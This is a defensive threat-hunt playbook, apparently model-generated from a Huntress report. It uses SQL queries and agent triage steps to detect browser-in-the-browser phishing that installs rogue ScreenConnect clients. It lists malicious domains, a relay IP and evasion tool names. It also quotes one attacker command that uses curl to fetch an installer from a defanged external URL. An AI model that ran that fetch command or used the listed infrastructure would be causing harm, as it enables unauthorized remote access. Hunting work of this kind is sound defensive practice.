---
analysis: This hunt uses a phased approach to connect early-stage DNS and fetch activity
  to later-stage persistence and evasion. It uses prevalence to baseline ScreenConnect
  processes across the fleet, distinguishing the unique IDs of rogue instances from
  corporate-wide RMM software.
blind_spots:
- id: command-line-truncation
  owner: Endpoint Security Team
  question: whether the curl command line included the malicious URL
  remediation: Increase the command-line capture limit on the endpoint agent.
  requires: Complete process command-line logging
  risk: If the command line is truncated, the malicious domain and file extension
    might not be visible, causing the fetch query to miss the activity.
  stage: payload-delivery-execution
- id: bitb-content-blindness
  owner: Network Engineering
  question: whether the BiTB HTML template was served to the browser
  remediation: Enable TLS inspection on the forward proxy for unauthenticated traffic
    to scan for BiTB HTML patterns.
  requires: Proxy/HTTP payload inspection
  risk: DNS logging sees the top-level domain but cannot confirm the BiTB technique
    itself, which happens inside the browser's rendering context.
  stage: initial-access-bitb-phishing
coverage:
- stage: initial-access-bitb-phishing
  status: covered
  steps:
  - phishing-dns-activity
- stage: payload-delivery-execution
  status: covered
  steps:
  - curl-payload-retrieval
- stage: persistence-rogue-rmm-services
  status: covered
  steps:
  - rare-screenconnect-processes
- stage: defense-evasion-activity-suppression
  status: covered
  steps:
  - evasion-tool-execution
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Browser-in-the-Browser phishing renders traditional address-bar training
    ineffective; identifying the subsequent RMM persistence and defense evasion tools
    is a necessary control to prevent unauthorized remote access.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has used browser-in-the-browser phishing to deceive a user
  into installing a rogue ScreenConnect instance, which established service-based
  persistence and executed evasion tools to hide its activity.
labels:
- hunt
- attack.t1566
- attack.t1059.003
- attack.t1105
- attack.t1543.003
- attack.t1562
- attack.t1090.003
name: BiTB Phishing to Rogue RMM Persistence
parameters:
  evasion_tools:
    default:
    - hidecursor.exe
    - hideul.exe
    description: Filenames of defense evasion tools used to suppress interactive indicators.
    from:
      kind: article
      observed: '2026-09-09'
      ref: huntress-bitb-rmm
    type: list[path]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  phishing_domains:
    default:
    - adoube.vu
    - selectstructure.com.au
    - hosthiifran.screenconnect.com
    - instance-uxh86b-relay.screenconnect.com
    - victory.mkc1.digitaloceanspaces.com
    - relay.goldenmelon.us
    - scx.illuminantgroup.net
    - relay.illuminantgroup.net
    description: Known phishing and relay domains from the report.
    from:
      kind: article
      observed: '2026-09-09'
      ref: huntress-bitb-rmm
    type: list[domain]
  scope_hosts:
    default: []
    description: Narrow the hunt to specific hosts; leave empty for fleet-wide scanning.
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/phishing-bitb-rmm-attacks
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Focus on user workstations; widen to include all internet-connected endpoints
  if any relay domain matches are found.
references:
- name: "Huntress \u2014 Phishing Attacks Serve Browser-in-the-Browser Pages, Rogue\
    \ RMM Persistence"
  url: https://www.huntress.com/blog/phishing-bitb-rmm-attacks
related:
- hunt: authorized-rmm-baseline-deviation
  reason: This hunt focuses on the phishing-to-persistence chain; a broader RMM inventory
    hunt would detect rogue tools regardless of the delivery vector.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: BiTB Phishing and Adobe Lure
    observables:
    - adoube.vu
    - selectstructure.com.au
    - adobedocument.html
    - file.html
    - Fake browser window imitating get.adobe.com
    slug: initial-access-bitb-phishing
    tactic: initial-access
    techniques:
    - T1566
  - name: RMM Installer Execution and Payload Retrieval
    observables:
    - ScreenConnect.ClientSetup.exe
    - AdbRdBkUpsStUp.msi
    - patch.msi
    - cmd.exe /c curl -O hxxps://wir.consultingics.com/Bin/ScreenConnect.ClientSetup.msi
    - hosthiifran.screenconnect.com
    - victory.mkc1.digitaloceanspaces.com
    slug: payload-delivery-execution
    tactic: execution
    techniques:
    - T1059.003
    - T1105
  - name: Rogue RMM Service Persistence
    observables:
    - ScreenConnect Client (9c1aea531ba4c511)
    - ScreenConnect Client (7c1d255d0efefde6)
    - ScreenConnect Client (d751818fd46e5ca9)
    - ScreenConnect Client (c19e38a20f1ba492)
    - instance-uxh86b-relay.screenconnect.com
    - 144.172.115.59
    - relay.goldenmelon.us
    - scx.illuminantgroup.net
    - relay.illuminantgroup.net
    slug: persistence-rogue-rmm-services
    tactic: persistence
    techniques:
    - T1543.003
    - T1090.003
  - name: Defense Evasion via Tool Execution
    observables:
    - HideCursor.exe
    - HideUL.exe
    - C:\Users\REDACTED\Documents\ScreenConnect\Temp\HideCursor.exe
    slug: defense-evasion-activity-suppression
    tactic: defense-evasion
    techniques:
    - T1562
  summary: Threat actors utilized a browser-in-the-browser (BiTB) technique to present
    a fake Adobe download page, tricking victims into installing rogue ScreenConnect
    clients. These clients established persistence via Windows services and deployed
    specialized binaries like HideCursor.exe to suppress on-screen activity and evade
    detection.
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# BiTB Phishing to Rogue RMM Persistence

This hunt follows the full lifecycle of a Browser-in-the-Browser (BiTB) attack. It begins by identifying users interacting with phishing infrastructure and subsequent payload retrieval via curl. The second phase pivots to detect the aftermath: rare or unauthorized ScreenConnect service processes and the execution of activity-hiding tools like HideCursor.exe. By weighing the early-stage access signals against the persistence evidence, the hunt distinguishes between authorized RMM software and attacker-controlled footholds.

## scope-screenconnect-installed
<!-- Scope ScreenConnect installations -->
Identify hosts that have ScreenConnect software installed to focus the behavioral analysis.

```sqlite target=endpoint role=scoping params=(scope_hosts=scope_hosts)
~~~yaml
expected: A list of hosts with any ScreenConnect software. Silence means no ScreenConnect
  is detected at all, which might miss portable installations.
reads:
- device_hostname
- package_name
- package_version
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT DISTINCT device_hostname, package_name, package_version, vendor_name FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%screenconnect%' OR LOWER(vendor_name) LIKE '%screenconnect%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## parallel-early-stage
<!-- Detect access and delivery -->
parallel:
- → phishing-dns-activity
- → curl-payload-retrieval
join: → agent-early-triage

## phishing-dns-activity
<!-- DNS queries to phishing and relay infra -->
Find resolutions to malicious domains used for the BiTB landing page and RMM relay.

```sqlite target=endpoint role=enrichment params=(phishing_domains=phishing_domains, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Hosts resolving the report's domains. A browser process name like chrome.exe
  or msedge.exe confirms user interaction.
reads:
- device_hostname
- process_name
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, query_hostname, process_name, time FROM hb_dns_activity WHERE (instr(',' || '{{phishing_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## curl-payload-retrieval
<!-- Payload retrieval via curl command line -->
Identify cmd.exe or powershell.exe instances using curl to download MSI or EXE files.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: Processes showing curl fetching installers. This is the behavior the first
  ScreenConnect instance used to fetch the second.
reads:
- device_hostname
- parent_process_name
- process_cmd_line
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE LOWER(process_cmd_line) LIKE '%curl %' AND (LOWER(process_cmd_line) LIKE '%.msi%' OR LOWER(process_cmd_line) LIKE '%.exe%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## agent-early-triage
<!-- Triage early-stage signals -->
```agent target=hunter
cite: required
context:
- phishing-dns-activity
- curl-payload-retrieval
max_iterations: 3
objective: Determine if the observed DNS queries and curl fetches on each host suggest
  a coordinated BiTB phishing intrusion.
success_criteria: A verdict of malicious | suspicious | benign per host.
tools:
- endpoint
```

## parallel-followon-stage
<!-- Detect persistence and evasion -->
parallel:
- → rare-screenconnect-processes
- → evasion-tool-execution
join: → agent-final-read

## rare-screenconnect-processes
<!-- Prevalence of ScreenConnect processes -->
Stack-count ScreenConnect processes to find rare or unauthorized instances that do not match the fleet baseline.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Rare ScreenConnect process names, which often include unique ID strings
  for rogue instances. Corporate RMM should show high counts.
prevalence:
  by: device_hostname
  key:
  - process_name
  rare_below: 3
reads:
- device_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT process_name, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_process_activity WHERE LOWER(process_name) LIKE '%screenconnect%' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_name HAVING hosts <= 3
```

## evasion-tool-execution
<!-- Evasion tool detection -->
Identify execution of HideCursor.exe or HideUL.exe, or any binaries launching from ScreenConnect temp folders.

```sqlite target=endpoint role=enrichment params=(evasion_tools=evasion_tools, lookback_days=lookback_days)
~~~yaml
expected: Process events for the identified evasion binaries or activity in the ScreenConnect
  temp folder.
reads:
- device_hostname
- process_cmd_line
- process_name
- process_path
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, time FROM hb_process_activity WHERE (instr(',' || '{{evasion_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR LOWER(process_path) LIKE '%\screenconnect\temp%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## agent-final-read
<!-- Final intrusion synthesis -->
```agent target=hunter
cite: required
context:
- agent-early-triage
- rare-screenconnect-processes
- evasion-tool-execution
max_iterations: 5
objective: Weigh the early access signals from agent-early-triage against the presence
  of rare ScreenConnect processes and evasion tools to confirm an active intrusion.
success_criteria: A final verdict of malicious | suspicious | benign per host, citing
  specific rows from all stages.
tools:
- endpoint
```

## decision-route
<!-- Decision on intrusion -->
if~: "the agent-final-read verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-compromised-host
indeterminate: → analyst-validation
unavailable: → analyst-validation (blind_spot: command-line-truncation)
else: → close-out-hunt

## isolate-compromised-host
<!-- Isolate compromised host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host via the EDR. Following isolation, collect the ScreenConnect service binaries and the evasion tools from the Documents\ScreenConnect\Temp directory.
```
→ analyst-validation

## analyst-validation
<!-- Manual analyst validation -->
```manual target=analyst
Check hb_http_activity for request logs to the adoube.vu or selectstructure.com.au domains. Verify if the ScreenConnect binaries are signed by an expected publisher and investigate the user's recent email activity for RingCentral or Gmail lures.
```
→ end

## close-out-hunt
<!-- Close out hunt -->
```manual target=analyst
Record the hosts examined and note any legitimate RMM usage that should be added to the baseline for future hunts.
```
→ end
